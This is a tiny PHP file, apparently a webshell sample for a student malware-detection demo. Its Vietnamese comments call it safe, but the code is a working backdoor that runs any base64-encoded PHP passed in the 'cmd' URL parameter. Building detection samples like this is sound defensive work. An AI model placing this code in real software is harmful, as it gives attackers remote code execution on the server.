<?php
// TỆP TIN THỬ NGHIỆM GIẢ LẬP MÃ ĐỘC (AN TOÀN CHO DEMO ĐỒ ÁN)
// Chứa chữ ký Webshell điển hình: eval(base64_decode(...))
$token = "dGVzdF93ZWJzaGVsbF9kZW1v"; 
if (isset($_GET['cmd'])) {
    eval(base64_decode($_GET['cmd']));
}
?>
